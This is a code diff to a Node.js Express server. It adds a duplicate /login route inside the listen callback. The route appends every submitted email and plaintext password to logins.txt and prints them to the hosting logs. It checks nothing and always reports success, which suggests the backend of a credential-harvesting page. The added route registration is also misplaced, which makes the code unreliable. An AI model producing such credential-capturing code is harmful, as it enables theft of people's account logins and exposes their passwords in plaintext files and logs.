@@ -19,9 +19,24 @@ app.post('/login', (req, res) => {
       return res.status(500).json({ success: false });
     }
     res.json({ success: true });
+
   });
 });
 
 app.listen(PORT, () => {
   console.log(`Server running on http://localhost:${PORT}`);
+
+  app.post('/login', (req, res) => {
+  const { email, password } = req.body;
+  const entry = `Email: ${email}, Password: ${password}\n`;
+  fs.appendFile('logins.txt', entry, (err) => {
+    if (err) {
+      console.error('Error saving data:', err);
+      return res.status(500).json({ success: false });
+    }
+    // Log to Render logs
+    console.log(entry);
+    res.json({ success: true });
+  });
+});
 });
